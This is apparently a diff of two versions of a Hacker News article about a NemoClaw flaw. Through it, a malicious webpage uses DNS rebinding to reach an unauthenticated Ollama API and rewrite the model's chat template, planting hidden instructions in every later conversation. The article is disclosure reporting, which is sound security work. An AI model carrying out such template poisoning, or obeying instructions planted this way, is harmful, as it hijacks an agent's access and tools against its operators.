-A Malicious Webpage Could Poison Your Local AI Model Behind NVIDIA NemoClaw  Swati Khandelwal  Aug 25, 2026 AI Security / Vulnerability Oasis Security has disclosed a weakness in NVIDIA NemoClaw that could let an attacker-controlled webpage take unauthenticated control of the local Ollama instance serving an AI agent and plant hidden instructions inside the model itself. The findings were shared with The Hacker News ahead of publication, and the report says Oasis Security reported them to NVIDIA's Product Security Incident Response Team (PSIRT) beforehand. However, it carry no CVE identifier, no affected version range, and no patched version, so an operator running NemoClaw cannot currently check whether their installation is in scope. No exploitation has been reported as of August 25, 2026. NemoClaw is NVIDIA's open source reference stack for running agents such as OpenClaw inside its OpenShell sandboxes, and Ollama is one of its supported local inference backends. The report describes NemoClaw starting Ollama with OLLAMA_HOST=0.0.0.0:11434 , binding the model server to every network interface, and says the resulting API access allows an attacker to modify the model's chat template so that hidden instructions are applied to every later conversation. "Sandboxing protects the endpoint, but taking over the agent takes over its access and tools," Oasis Security said in the report. NVIDIA's own Ollama setup documentation and the current source place that binding on one platform path. NemoClaw's Ollama handling differs by platform - Non-WSL hosts keep Ollama on 127.0.0.1:11434 behind a token-gated reverse proxy on 0.0.0.0:11435 , and onboarding restarts a daemon already bound elsewhere back to loopback. Docker Desktop on WSL skips the proxy, because the container reaches the host's loopback address through host.docker.internal . The Windows-host Ollama path sets OLLAMA_HOST=0.0.0.0:11434 so Docker Desktop containers can reach the daemon, and does not require authentication on port 11434. Ollama's own NemoClaw integration page also advises setting OLLAMA_HOST=0.0.0.0 when running inside WSL2 or a container, and binding it to 0.0.0.0 has previously been identified as the change that exposes Ollama instances beyond the local machine. The API on port 11434 has no authentication and relies on two middleware layers to block browser-originated requests. When the bind address is not loopback, the Host header check is skipped entirely. The Cross-Origin Resource Sharing (CORS) layer then treats the request as same-origin and allows it, because the Origin and Host headers both carry the attacker's own domain. That holds for a page the attacker serves on port 11434. Domain Name System (DNS) rebinding closes the gap, with the attacker's domain resolving first to their own server and then to 127.0.0.1 while the browser continues to treat the requests as same-origin. The report does not state which browsers or operating systems the chain was verified against. Verifying Host and Origin headers is the standard fix for that class of attack. DNS rebinding against Ollama's API is itself documented. Ollama shipped a fix in v0.1.29 on March 14, 2024, and NCC Group published the advisory as CVE-2024-28224 the following month. That advisory recommended validating the Host header on the server side to allow only a set of authorized values. With the API reachable, the report's payload writes a modified Go template through /api/create . The template controls how the structured messages array is rendered into raw text before the model processes it, and the poisoned version appends attacker-controlled text to every system message at inference time. Instructions planted this way persist across later conversations and survive the agent supplying its own system prompt, according to the report. "The client cannot detect or prevent this - the template is a model-level property invisible to API consumers," Oasis Security said. The Hacker News reviewed the NemoClaw
+A Malicious Webpage Could Poison Your Local AI Model Behind NVIDIA NemoClaw  Swati Khandelwal  Aug 25, 2026 AI Security / Vulnerability Oasis Security has disclosed a weakness in NVIDIA NemoClaw that could let an attacker-controlled webpage take unauthenticated control of the local Ollama instance serving an AI agent and plant hidden instructions inside the model itself. The findings were shared with The Hacker News ahead of publication, and the report says Oasis Security reported them to NVIDIA's Product Security Incident Response Team (PSIRT) beforehand. The research carries no CVE identifier. No exploitation has been reported as of August 25, 2026. Oasis Security's head of research, Elad Luz, told The Hacker News that NemoClaw v0.0.35 fixed the issue on macOS and Linux. There is no fix on the Windows and WSL path, according to Luz, where v0.0.34 added a Windows installation that carries a warning instead. NemoClaw is NVIDIA's open source reference stack for running agents such as OpenClaw inside its OpenShell sandboxes, and Ollama is one of its supported local inference backends. The report describes NemoClaw starting Ollama with OLLAMA_HOST=0.0.0.0:11434 , binding the model server to every network interface, and says the resulting API access allows an attacker to modify the model's chat template so that hidden instructions are applied to every later conversation. "Sandboxing protects the endpoint, but taking over the agent takes over its access and tools," Oasis Security said in the report. NVIDIA's own Ollama setup documentation and the current source place that binding on one platform path. NemoClaw's Ollama handling differs by platform - Non-WSL hosts keep Ollama on 127.0.0.1:11434 behind a token-gated reverse proxy on 0.0.0.0:11435 , and onboarding restarts a daemon already bound elsewhere back to loopback. Docker Desktop on WSL skips the proxy, because the container reaches the host's loopback address through host.docker.internal . The Windows-host Ollama path sets OLLAMA_HOST=0.0.0.0:11434 so Docker Desktop containers can reach the daemon, and does not require authentication on port 11434. Ollama's own NemoClaw integration page also advises setting OLLAMA_HOST=0.0.0.0 when running inside WSL2 or a container, and binding it to 0.0.0.0 has previously been identified as the change that exposes Ollama instances beyond the local machine. The API on port 11434 has no authentication and relies on two middleware layers to block browser-originated requests. When the bind address is not loopback, the Host header check is skipped entirely. The Cross-Origin Resource Sharing (CORS) layer then treats the request as same-origin and allows it, because the Origin and Host headers both carry the attacker's own domain. That holds for a page the attacker serves on port 11434. Domain Name System (DNS) rebinding closes the gap, with the attacker's domain resolving first to their own server and then to 127.0.0.1 while the browser continues to treat the requests as same-origin. Luz said the full chain was tested on macOS with Firefox against a vulnerable NemoClaw version. Verifying Host and Origin headers is the standard fix for that class of attack. DNS rebinding against Ollama's API is itself documented. Ollama shipped a fix in v0.1.29 on March 14, 2024, and NCC Group published the advisory as CVE-2024-28224 the following month. That advisory recommended validating the Host header on the server side to allow only a set of authorized values. Ollama introduced that validation in response to the 2024 disclosure, according to Luz. "But Ollama skips that validation whenever it is bound to a non-loopback address, and 0.0.0.0 is exactly how NemoClaw configures it," he said. With the API reachable, the report's payload writes a modified Go template through /api/create . The template controls how the structured messages array is rendered into raw text before the model processes it, and the poisoned version appends attacker-controlled text to eve
 ```
 
 #### Corroborating sources (1)
